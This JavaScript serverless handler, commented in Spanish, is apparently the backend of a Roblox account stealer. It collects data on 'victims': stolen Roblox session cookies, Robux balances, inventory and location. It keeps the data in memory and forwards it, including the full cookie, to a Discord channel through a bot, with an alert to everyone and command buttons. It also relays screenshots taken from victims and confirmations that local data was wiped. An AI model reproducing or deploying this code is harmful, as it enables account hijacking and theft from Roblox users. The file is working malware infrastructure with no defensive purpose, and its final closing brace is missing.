// api/log.js
export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;
    console.log('📥 Datos recibidos:', JSON.stringify(data, null, 2));

    // Si es un tipo especial (resultado de una acción), reenviar a Discord
    if (data.type === 'screenshot') {
        try {
            const base64Data = data.image.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');

            const formData = new FormData();
            formData.append('file', new Blob([buffer]), 'screenshot.png');
            formData.append('payload_json', JSON.stringify({
                content: `📸 **CAPTURA DE PANTALLA RECIBIDA**\nUsuario: ${data.userId || 'Desconocido'}`
            }));

            await fetch(`https://discord.com/api/v10/channels/${process.env.DISCORD_CHANNEL_ID}/messages`, {
                method: 'POST',
                headers: { 'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}` },
                body: formData
            });
        } catch (error) {
            console.error('Error procesando captura:', error);
        }
        return res.status(200).json({ status: 'ok' });
    }

    if (data.type === 'cleanup') {
        try {
            await fetch(`https://discord.com/api/v10/channels/${process.env.DISCORD_CHANNEL_ID}/messages`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `🧹 **DATOS LOCALES ELIMINADOS**\nUsuario: ${data.userId || 'Desconocido'}\nEstado: ${data.message || 'Limpieza completada'}`
                })
            });
        } catch (error) {
            console.error('Error enviando confirmación de limpieza:', error);
        }
        return res.status(200).json({ status: 'ok' });
    }

    // ============================================================
    // 🔥 PARTE MODIFICADA: Guardar datos de la víctima correctamente
    // ============================================================
    
    // Generar un identificador único para la víctima
    const userId = data.roblox?.userId || `anon_${Date.now()}`;

    // Guardar TODOS los datos de la víctima en memoria global
    if (!global.victims) global.victims = new Map();
    global.victims.set(userId, {
        roblox: data.roblox || {},
        cookie: data.cookie || 'No disponible',
        pais: data.pais || 'Desconocido',
        fecha: data.fecha || '',
        hora: data.hora || '',
        userAgent: data.userAgent || ''
    });

    // ============================================================
    // FIN DE LA PARTE MODIFICADA
    // ============================================================

    // Preparar embed con el FORMATO EXACTO que pediste
    const embed = {
        title: '🔔 ¡NUEVA VÍCTIMA CONECTADA!',
        color: 0x9b59b6, // Morado
        fields: [
            {
                name: '📌 PRINCIPAL',
                value: '`✅️CUENTA REAL/❌️ CUENTA RECIEN CREADA.`',
                inline: false
            },
            {
                name: '👤 Usuario Roblox',
                value: data.roblox?.username || 'No disponible',
                inline: true
            },
            {
                name: '🆔 ID',
                value: data.roblox?.userId?.toString() || 'No disponible',
                inline: true
            },
            {
                name: '💰 Robux',
                value: data.roblox?.robux?.toString() || '0',
                inline: true
            },
            {
                name: '⭐ Seguidores',
                value: data.roblox?.seguidores?.toString() || '0',
                inline: true
            },
            {
                name: '👥 Amigos',
                value: data.roblox?.amigos?.toString() || '0',
                inline: true
            },
            {
                name: '💱 Premium',
                value: data.roblox?.premium || 'No',
                inline: true
            },
            {
                name: '🔰 Verificado',
                value: data.roblox?.verified || 'No',
                inline: true
            },
            {
                name: '💼 **Inventario:**',
                value: `Headless: \`${data.roblox?.headless || 'No'}\`\nKorblox: \`${data.roblox?.korblox || 'No'}\``,
                inline: false
            },
            {
                name: '**Informacion Horaria:**',
                value: `🌍 País: \`${data.pais || 'Desconocido'}\`\n📅 Fecha: \`${data.fecha || ''}\`\n⏰ Hora Exacta: \`${data.hora || ''}\``,
                inline: false
            },
            {
                name: '🍪 Cookie:',
                value: `\`\`\`${data.cookie || 'No disponible'}\`\`\``,
                inline: false
            }
        ],
        footer: { text: `ID: ${userId}` }
    };

    // Crear botones con los estilos que pediste
    const components = [
        {
            type: 1,
            components: [
                {
                    type: 2,
                    style: 1, // Azul
                    label: 'DISCORD',
                    custom_id: `discord_${userId}`,
                    emoji: { name: '🔵' }
                },
                {
                    type: 2,
                    style: 1, // Azul
                    label: 'ROBLOX',
                    custom_id: `roblox_${userId}`,
                    emoji: { name: '🔴' }
                }
            ]
        },
        {
            type: 1,
            components: [
                {
                    type: 2,
                    style: 2, // Gris
                    label: 'COMANDOS',
                    custom_id: `comandos_${userId}`,
                    emoji: { name: '⚫' }
                }
            ]
        }
    ];

    // Enviar mensaje a Discord
    const token = process.env.DISCORD_BOT_TOKEN;
    const channelId = process.env.DISCORD_CHANNEL_ID;

    if (!token || !channelId) {
        return res.status(500).json({ error: 'Bot token or channel ID not configured' });
    }

    try {
    const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
        method: 'POST',
        headers: {
            'Authorization': `Bot ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: '||@everyone||\n\nSelecciona una opcion:',
            embeds: [embed],
            components: components
        })
    });

    if (!response.ok) {
        return res.status(500).json({ error: 'Error sending to Discord' });
    }

    res.status(200).json({ status: 'ok', userId: userId });
    
} catch (error) {
    res.status(500).json({ error: 'Internal server error' });
}
        

        